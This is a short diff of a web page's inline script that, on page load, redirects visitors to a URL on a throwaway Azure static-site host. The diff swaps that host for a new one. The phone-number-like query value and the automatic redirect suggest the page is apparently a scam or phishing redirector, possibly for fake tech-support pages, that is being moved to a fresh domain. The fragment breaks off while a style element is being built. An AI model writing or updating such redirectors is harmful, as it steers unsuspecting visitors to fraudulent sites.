@@ -6,7 +6,7 @@
 <script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://jonn1-secondary.z8.web.core.windows.net/?bcda=(0101)-88844-98569";
+            const redirectUrl = "https://jonn2.z33.web.core.windows.net/?bcda=(0101)-88844-98569";
 
             const style = document.createElement("style");
             style.textContent = `
